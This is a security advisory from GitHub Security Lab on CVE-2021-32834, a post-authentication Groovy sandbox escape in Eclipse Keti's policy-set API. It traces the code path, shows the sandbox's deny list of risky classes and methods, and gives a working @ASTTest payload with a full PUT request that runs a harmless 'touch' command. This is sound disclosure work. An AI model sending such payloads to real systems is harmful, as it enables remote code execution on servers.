<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">August 30, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2021-063: Arbitrary code execution in Eclipse Keti - CVE-2021-32834</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/pwntester">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/125701?s=35" height="35" width="35">
        <span>Alvaro Munoz</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      
<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>2021-04-27: Reported to security@eclipse.org</li>
  <li>2021-07-26: Disclosure deadline is reached.</li>
  <li>2021-08-16: Report is made <a href="https://bugs.eclipse.org/bugs/show_bug.cgi?id=573192">public</a> in Eclipse system.</li>
  <li>2021-09-01: Disclosing as per our disclosure policy.</li>
</ul>

<h2 id="summary">Summary</h2>
<p>A user able to create Policy Sets can run arbitrary code by sending malicious Groovy scripts which will escape the configured Groovy sandbox.</p>

<h2 id="product">Product</h2>
<p>Eclipse Keti</p>

<h2 id="tested-version">Tested Version</h2>
<p>Latest commit at the date of reporting (a1c8dbe)</p>

<h2 id="details">Details</h2>

<h3 id="issue-1-arbitrary-groovy-script-evaluation">Issue 1: Arbitrary Groovy script evaluation</h3>

<p>The PolicySet object received by <code class="language-plaintext highlighter-rouge">createPolicySet</code> in <a href="https://github.com/eclipse/keti/blob/a1c8dbeba85235fc7dd23619316ed7e500bc0b14/service/src/main/java/org/eclipse/keti/acs/service/policy/admin/PolicyManagementController.java"><code class="language-plaintext highlighter-rouge">PolicyManagementController</code></a> flows into a Groovy script evaluation as shown in <a href="https://lgtm.com/query/3175734029228179850/">this CodeQL query</a></p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">method</span> <span class="o">=</span> <span class="no">PUT</span><span class="o">,</span> <span class="n">value</span> <span class="o">=</span> <span class="no">POLICY_SET_URL</span><span class="o">,</span> <span class="n">consumes</span> <span class="o">=</span> <span class="nc">MediaType</span><span class="o">.</span><span class="na">APPLICATION_JSON_VALUE</span><span class="o">)</span>
    <span class="kd">public</span> <span class="nc">ResponseEntity</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="nf">createPolicySet</span><span class="o">(</span><span class="nd">@RequestBody</span> <span class="kd">final</span> <span class="nc">PolicySet</span> <span class="n">policySet</span><span class="o">,</span>
            <span class="nd">@PathVariable</span><span class="o">(</span><span class="s">"policySetId"</span><span class="o">)</span> <span class="kd">final</span> <span class="nc">String</span> <span class="n">policySetId</span><span class="o">)</span> <span class="o">{</span>

        <span class="n">validatePolicyIdOrFail</span><span class="o">(</span><span class="n">policySet</span><span class="o">,</span> <span class="n">policySetId</span><span class="o">);</span>

        <span class="k">try</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">service</span><span class="o">.</span><span class="na">upsertPolicySet</span><span class="o">(</span><span class="n">policySet</span><span class="o">);</span>
            <span class="no">URI</span> <span class="n">policySetUri</span> <span class="o">=</span> <span class="nc">UriTemplateUtils</span><span class="o">.</span><span class="na">expand</span><span class="o">(</span><span class="no">POLICY_SET_URL</span><span class="o">,</span> <span class="s">"policySetId:"</span> <span class="o">+</span> <span class="n">policySet</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
            <span class="k">return</span> <span class="nf">created</span><span class="o">(</span><span class="n">policySetUri</span><span class="o">.</span><span class="na">getPath</span><span class="o">());</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">PolicyManagementException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nf">RestApiException</span><span class="o">(</span><span class="nc">HttpStatus</span><span class="o">.</span><span class="na">UNPROCESSABLE_ENTITY</span><span class="o">,</span> <span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">(),</span> <span class="n">e</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">this.service.upsertPolicySet(policySet);</code> is defined in <a href="https://github.com/eclipse/keti/blob/a1c8dbeba85235fc7dd23619316ed7e500bc0b14/service/src/main/java/org/eclipse/keti/acs/service/policy/admin/PolicyManagementServiceImpl.java"><code class="language-plaintext highlighter-rouge">PolicyManagementServiceImpl</code></a></p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">upsertPolicySet</span><span class="o">(</span><span class="kd">final</span> <span class="nc">PolicySet</span> <span class="n">policySet</span><span class="o">)</span> <span class="o">{</span>

        <span class="nc">String</span> <span class="n">policySetName</span> <span class="o">=</span> <span class="n">policySet</span><span class="o">.</span><span class="na">getName</span><span class="o">();</span>

        <span class="k">try</span> <span class="o">{</span>
            <span class="nc">ZoneEntity</span> <span class="n">zone</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">zoneResolver</span><span class="o">.</span><span class="na">getZoneEntityOrFail</span><span class="o">();</span>

            <span class="n">validatePolicySet</span><span class="o">(</span><span class="n">zone</span><span class="o">,</span> <span class="n">policySet</span><span class="o">);</span>

            <span class="nc">String</span> <span class="n">policySetPayload</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">jsonUtils</span><span class="o">.</span><span class="na">serialize</span><span class="o">(</span><span class="n">policySet</span><span class="o">);</span>
            <span class="n">upsertPolicySetInTransaction</span><span class="o">(</span><span class="n">policySetName</span><span class="o">,</span> <span class="n">zone</span><span class="o">,</span> <span class="n">policySetPayload</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">handleException</span><span class="o">(</span><span class="n">e</span><span class="o">,</span> <span class="n">policySetName</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">validatePolicySet(zone, policySet);</code> ends up calling <code class="language-plaintext highlighter-rouge">validatePolicySet</code> on <a href="https://github.com/eclipse/keti/blob/a1c8dbeba85235fc7dd23619316ed7e500bc0b14/service/src/main/java/org/eclipse/keti/acs/service/policy/validation/PolicySetValidatorImpl.java#L83"><code class="language-plaintext highlighter-rouge">PolicySetValidatorImpl</code></a></p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">validatePolicySet</span><span class="o">(</span><span class="kd">final</span> <span class="nc">PolicySet</span> <span class="n">policySet</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">validateSchema</span><span class="o">(</span><span class="n">policySet</span><span class="o">);</span>
        <span class="k">for</span> <span class="o">(</span><span class="nc">Policy</span> <span class="n">p</span> <span class="o">:</span> <span class="n">policySet</span><span class="o">.</span><span class="na">getPolicies</span><span class="o">())</span> <span class="o">{</span>
            <span class="n">validatePolicyConditions</span><span class="o">(</span><span class="n">p</span><span class="o">.</span><span class="na">getConditions</span><span class="o">());</span>
            <span class="n">validatePolicyActions</span><span class="o">(</span><span class="n">p</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
</code></pre></div></div>

<p>Since PolicySet conditions are basically Groovy expressions, <code class="language-plaintext highlighter-rouge">validatePolicyConditions(p.getConditions());</code> will end up <a href="https://github.com/eclipse/keti/blob/a1c8dbeba85235fc7dd23619316ed7e500bc0b14/service/src/main/java/org/eclipse/keti/acs/service/policy/validation/PolicySetValidatorImpl.java#L155">parsing them</a> as <a href="https://github.com/eclipse/keti/blob/a1c8dbeba85235fc7dd23619316ed7e500bc0b14/commons/src/main/java/org/eclipse/keti/acs/commons/policy/condition/groovy/GroovyConditionShell.java#L97">Groovy scripts</a>:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nc">ConditionScript</span> <span class="n">compiledScript</span> <span class="o">=</span> <span class="n">conditionCache</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">script</span><span class="o">);</span>
  <span class="k">if</span> <span class="o">(</span><span class="n">compiledScript</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
      <span class="nc">Script</span> <span class="n">groovyScript</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">shell</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">script</span><span class="o">);</span>
      <span class="n">compiledScript</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">GroovyConditionScript</span><span class="o">(</span><span class="n">groovyScript</span><span class="o">);</span>
      <span class="n">conditionCache</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">script</span><span class="o">,</span> <span class="n">compiledScript</span><span class="o">);</span>
  <span class="o">}</span>
</code></pre></div></div>

<p>Arbitrary evaluation of Groovy expressions allow attackers to run arbitrary code.</p>

<h3 id="issue-2-groovy-sandbox-escape">Issue 2: Groovy Sandbox escape</h3>
<p>The Groovy Shell used to parse and evaluate the PolicySet conditions is sandboxed by:</p>

<ol>
  <li>Using a <code class="language-plaintext highlighter-rouge">SecureASTCustomizer</code> which disables method definitions, disallow all imports, set an allow-list for constant type classes and receiver classes.</li>
</ol>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">private</span> <span class="kd">static</span> <span class="nc">SecureASTCustomizer</span> <span class="nf">createSecureASTCustomizer</span><span class="o">()</span> <span class="o">{</span>
        <span class="nc">SecureASTCustomizer</span> <span class="n">secureASTCustomizer</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SecureASTCustomizer</span><span class="o">();</span>
        <span class="c1">// Allow closures.</span>
        <span class="n">secureASTCustomizer</span><span class="o">.</span><span class="na">setClosuresAllowed</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="c1">// Disallow method definition.</span>
        <span class="n">secureASTCustomizer</span><span class="o">.</span><span class="na">setMethodDefinitionAllowed</span><span class="o">(</span><span class="kc">false</span><span class="o">);</span>
        <span class="c1">// Disallow all imports by setting a blank whitelist.</span>
        <span class="n">secureASTCustomizer</span><span class="o">.</span><span class="na">setImportsWhitelist</span><span class="o">(</span><span class="nc">Collections</span><span class="o">.</span><span class="na">emptyList</span><span class="o">());</span>
        <span class="c1">// Disallow star imports by setting a blank whitelist.</span>
        <span class="n">secureASTCustomizer</span><span class="o">.</span><span class="na">setStarImportsWhitelist</span><span class="o">(</span><span class="nc">Arrays</span><span class="o">.</span><span class="na">asList</span><span class="o">(</span>
                <span class="s">"org.crsh.command.*"</span><span class="o">,</span> <span class="s">"org.crsh.cli.*"</span><span class="o">,</span> <span class="s">"org.crsh.groovy.*"</span><span class="o">,</span>
                <span class="s">"org.eclipse.keti.acs.commons.policy.condition.*"</span><span class="o">));</span>
        <span class="c1">// Set white list for constant type classes.</span>
        <span class="n">secureASTCustomizer</span><span class="o">.</span><span class="na">setConstantTypesClassesWhiteList</span><span class="o">(</span><span class="nc">Arrays</span><span class="o">.</span><span class="na">asList</span><span class="o">(</span>
                <span class="nc">Boolean</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">boolean</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">Collection</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">Double</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">double</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">Float</span><span class="o">.</span><span class="na">class</span><span class="o">,</span>
                <span class="kt">float</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">Integer</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">Long</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">long</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">));</span>
        <span class="n">secureASTCustomizer</span><span class="o">.</span><span class="na">setReceiversClassesWhiteList</span><span class="o">(</span><span class="nc">Arrays</span><span class="o">.</span><span class="na">asList</span><span class="o">(</span>
                <span class="nc">Boolean</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">Collection</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">Integer</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">Iterable</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">Set</span><span class="o">.</span><span class="na">class</span><span class="o">,</span>
                <span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">));</span>
        <span class="k">return</span> <span class="n">secureASTCustomizer</span><span class="o">;</span>
    <span class="o">}</span>
</code></pre></div></div>

<ol>
  <li>Configures an AST transformation customizer which relies on <a href="https://github.com/eclipse/keti/blob/a1c8dbeba85235fc7dd23619316ed7e500bc0b14/commons/src/main/java/org/eclipse/keti/acs/commons/policy/condition/groovy/GroovySecureExtension.java"><code class="language-plaintext highlighter-rouge">GroovySecureExtension</code></a> to further limit which method calls are allowed:</li>
</ol>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">private</span> <span class="kd">static</span> <span class="nc">ASTTransformationCustomizer</span> <span class="nf">createASTTransformationCustomizer</span><span class="o">()</span> <span class="o">{</span>

        <span class="k">return</span> <span class="k">new</span> <span class="nf">ASTTransformationCustomizer</span><span class="o">(</span><span class="n">singletonMap</span><span class="o">(</span><span class="s">"extensions"</span><span class="o">,</span>
                <span class="n">singletonList</span><span class="o">(</span><span class="s">"org.eclipse.keti.acs.commons.policy.condition.groovy.GroovySecureExtension"</span><span class="o">)),</span>
                <span class="nc">CompileStatic</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
    <span class="o">}</span>
</code></pre></div></div>

<p>This extension uses both, an allow-list and block-list to limit variable access and method calls to a small set of known good variables/methods:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onMethodSelection</span><span class="o">(</span><span class="kd">final</span> <span class="nc">Expression</span> <span class="n">expression</span><span class="o">,</span> <span class="kd">final</span> <span class="nc">MethodNode</span> <span class="n">target</span><span class="o">)</span> <span class="o">{</span>
        <span class="c1">// First the white list.</span>
        <span class="k">if</span> <span class="o">((!</span><span class="s">"org.eclipse.keti.acs.commons.policy.condition.AbstractHandler"</span>
                <span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">target</span><span class="o">.</span><span class="na">getDeclaringClass</span><span class="o">().</span><span class="na">getName</span><span class="o">()))</span>
                <span class="o">&amp;&amp;</span> <span class="o">(!</span><span class="s">"org.eclipse.keti.acs.commons.policy.condition.AbstractHandlers"</span>
                <span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">target</span><span class="o">.</span><span class="na">getDeclaringClass</span><span class="o">().</span><span class="na">getName</span><span class="o">()))</span>
                <span class="o">&amp;&amp;</span> <span class="o">(!</span><span class="s">"org.eclipse.keti.acs.commons.policy.condition.ResourceHandler"</span>
                <span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">target</span><span class="o">.</span><span class="na">getDeclaringClass</span><span class="o">().</span><span class="na">getName</span><span class="o">()))</span>
                <span class="o">&amp;&amp;</span> <span class="o">(!</span><span class="s">"org.eclipse.keti.acs.commons.policy.condition.SubjectHandler"</span>
                <span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">target</span><span class="o">.</span><span class="na">getDeclaringClass</span><span class="o">().</span><span class="na">getName</span><span class="o">()))</span>
                <span class="o">&amp;&amp;</span> <span class="o">(!</span><span class="s">"org.eclipse.keti.acs.commons.policy.condition.groovy.AttributeMatcher"</span>
                <span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">target</span><span class="o">.</span><span class="na">getDeclaringClass</span><span class="o">().</span><span class="na">getName</span><span class="o">()))</span> <span class="o">&amp;&amp;</span> <span class="o">(!</span><span class="s">"java.lang.Boolean"</span>
                <span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">target</span><span class="o">.</span><span class="na">getDeclaringClass</span><span class="o">().</span><span class="na">getName</span><span class="o">()))</span> <span class="o">&amp;&amp;</span> <span class="o">(!</span><span class="s">"java.lang.Integer"</span>
                <span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">target</span><span class="o">.</span><span class="na">getDeclaringClass</span><span class="o">().</span><span class="na">getName</span><span class="o">()))</span> <span class="o">&amp;&amp;</span> <span class="o">(!</span><span class="s">"java.lang.Iterable"</span>
                <span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">target</span><span class="o">.</span><span class="na">getDeclaringClass</span><span class="o">().</span><span class="na">getName</span><span class="o">()))</span> <span class="o">&amp;&amp;</span> <span class="o">(!</span><span class="s">"java.lang.Object"</span>
                <span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">target</span><span class="o">.</span><span class="na">getDeclaringClass</span><span class="o">().</span><span class="na">getName</span><span class="o">()))</span>
                <span class="c1">// This means we allow collections of type Object.</span>
                <span class="o">&amp;&amp;</span> <span class="o">(!</span><span class="s">"[Ljava.lang.Object;"</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">target</span><span class="o">.</span><span class="na">getDeclaringClass</span><span class="o">().</span><span class="na">getName</span><span class="o">()))</span> <span class="o">&amp;&amp;</span> <span class="o">(!</span><span class="s">"java.lang.String"</span>
                <span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">target</span><span class="o">.</span><span class="na">getDeclaringClass</span><span class="o">().</span><span class="na">getName</span><span class="o">()))</span> <span class="o">&amp;&amp;</span> <span class="o">(!</span><span class="s">"java.util.Collection"</span>
                <span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">target</span><span class="o">.</span><span class="na">getDeclaringClass</span><span class="o">().</span><span class="na">getName</span><span class="o">()))</span> <span class="o">&amp;&amp;</span> <span class="o">(!</span><span class="s">"java.util.Set"</span>
                <span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">target</span><span class="o">.</span><span class="na">getDeclaringClass</span><span class="o">().</span><span class="na">getName</span><span class="o">())))</span> <span class="o">{</span>
            <span class="n">addStaticTypeError</span><span class="o">(</span><span class="s">"Method call for '"</span> <span class="o">+</span> <span class="n">target</span><span class="o">.</span><span class="na">getDeclaringClass</span><span class="o">().</span><span class="na">getName</span><span class="o">()</span> <span class="o">+</span> <span class="s">"' class is not allowed!"</span><span class="o">,</span>
                    <span class="n">expression</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="c1">// Then the black list.</span>
        <span class="k">if</span> <span class="o">(</span><span class="s">"java.lang.System"</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">target</span><span class="o">.</span><span class="na">getDeclaringClass</span><span class="o">().</span><span class="na">getName</span><span class="o">()))</span> <span class="o">{</span>
            <span class="n">addStaticTypeError</span><span class="o">(</span><span class="s">"Method call for 'java.lang.System' class is not allowed!"</span><span class="o">,</span> <span class="n">expression</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="k">if</span> <span class="o">(</span><span class="s">"groovy.util.Eval"</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">target</span><span class="o">.</span><span class="na">getDeclaringClass</span><span class="o">().</span><span class="na">getName</span><span class="o">()))</span> <span class="o">{</span>
            <span class="n">addStaticTypeError</span><span class="o">(</span><span class="s">"Method call for 'groovy.util.Eval' class is not allowed!"</span><span class="o">,</span> <span class="n">expression</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="k">if</span> <span class="o">(</span><span class="s">"java.io"</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">target</span><span class="o">.</span><span class="na">getDeclaringClass</span><span class="o">().</span><span class="na">getName</span><span class="o">()))</span> <span class="o">{</span>
            <span class="n">addStaticTypeError</span><span class="o">(</span><span class="s">"Method call for 'java.io' package is not allowed!"</span><span class="o">,</span> <span class="n">expression</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="k">if</span> <span class="o">(</span><span class="s">"execute"</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">target</span><span class="o">.</span><span class="na">getName</span><span class="o">()))</span> <span class="o">{</span>
            <span class="n">addStaticTypeError</span><span class="o">(</span><span class="s">"Method call 'execute' is not allowed!"</span><span class="o">,</span> <span class="n">expression</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
</code></pre></div></div>

<p>However, as explained in <a href="https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html">Orange Tsai’s blog post</a>, Groovy meta-programming can be used to bypass these protections. For example, the <code class="language-plaintext highlighter-rouge">@ASTTest</code> annotation allows developers to assert other AST transformations. Since it is an annotation, it is not visited by the <code class="language-plaintext highlighter-rouge">onMethodSelection</code> method of <code class="language-plaintext highlighter-rouge">ASTTransformationCustomizer</code> and the assertion call is not subject to further inspection. Therefore, it is possible to run arbitrary code from these assertions, for example:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@groovy</span><span class="o">.</span><span class="na">transform</span><span class="o">.</span><span class="na">ASTTest</span><span class="o">(</span><span class="n">value</span><span class="o">={</span><span class="k">assert</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"touch /tmp/pwned"</span><span class="o">)})</span> <span class="n">def</span> <span class="n">x</span>
</code></pre></div></div>

<h4 id="poc-request">PoC request</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PUT /v1/policy-set/default
Authorization: bearer &lt;token&gt;
Accept: application/json
Content-Type: application/json
Predix-Zone-Id: demo

{
  "name" : "default",
  "policies" : [
    {
      "name" : "Analysts can access engines if they belong to the same group.",
      "target" : {
        "resource" : {
          "name" : "Engine",
          "uriTemplate" : "/engines/{engine_id}"
        },
        "action" : "GET",
        "subject" : {
          "name" : "Analysts",
          "attributes" : [
            {
              "issuer" : "https://acs.predix.io",
              "name"   : "role",
              "value"  : "analyst"
            }
          ]
        }
      },
      "conditions" : [
        { 
          "name"      : "is a member of the same group",
          "condition" : "@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec('touch /tmp/pwned-keti')}) def x" 
        }
      ],
      "effect" : "PERMIT"
    },
    {
      "name" : "Deny all other requests.",
      "effect" : "DENY"
    }
  ]
}
</code></pre></div></div>

<h4 id="impact">Impact</h4>
<p>These issue may lead to post-authentication Remote Code execution.</p>

<h2 id="cve">CVE</h2>

<ul>
  <li>CVE-2021-32834</li>
</ul>

<h2 id="credit">Credit</h2>
<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/pwntester">@pwntester (Alvaro Muñoz)</a>.</p>

<h2 id="contact">Contact</h2>
<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2021-063</code> in any communication regarding this issue.</p>


 